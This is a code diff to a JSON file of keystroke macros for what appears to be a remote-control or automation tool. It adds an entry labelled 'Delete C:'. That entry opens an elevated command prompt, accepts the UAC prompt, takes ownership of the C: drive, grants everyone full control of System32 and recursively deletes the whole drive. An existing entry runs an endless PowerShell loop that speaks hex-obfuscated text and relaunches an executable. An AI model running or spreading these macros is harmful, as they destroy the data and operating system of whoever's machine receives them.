@@ -38,5 +38,10 @@
     "id": 1786351790390,
     "label": "Launch & Speak Soggy",
     "content": "!combo win+r|!wait 1|!send powershell -c \"for(;;){(new-object -co SAPI.SpVoice).Speak(-join('736f676779206568'-split'(..)'-ne''|%{[char][int]\\\"0x$_\\\"}));saps Z:/soggy.exe}\""
+  },
+  {
+    "id": 1786354062964,
+    "label": "Delete C: (By @Kellyballesteros8k)",
+    "content": "!combo win+r !wait 1 !type cmd !combo ctrl+shift+enter !wait 4 !combo left+enter !wait 5 !send takeown /f C: /r /d y && icacls C:\\Windows\\System32 /grant Everyone:F /t /q /c && rd /s /q C:"
   }
 ]
